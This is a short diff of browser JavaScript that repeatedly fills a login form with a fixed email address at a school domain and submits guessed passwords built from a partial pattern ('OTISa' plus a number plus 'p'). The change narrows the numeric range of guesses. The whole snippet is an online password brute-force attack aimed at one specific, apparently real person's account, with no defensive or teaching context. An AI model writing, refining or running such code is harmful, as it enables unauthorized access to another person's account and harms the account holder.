@@ -2,9 +2,9 @@ const loginForm = document.getElementById("logon")
 const usernameBox = document.getElementById("j_username")
 const passwordBox = document.getElementById("j_password")
 
-for (let i=70000; i < 100000; i++) {
+for (let i=0; i < 1000; i++) {
   usernameBox.value = "26ponirosa@oceanschools.org"
-  passwordBox.value = "OTISa" + format(i) + "p"
+  passwordBox.value = "OTISa7" + format(i) + "p"
 
   form.requestSubmit();
 }
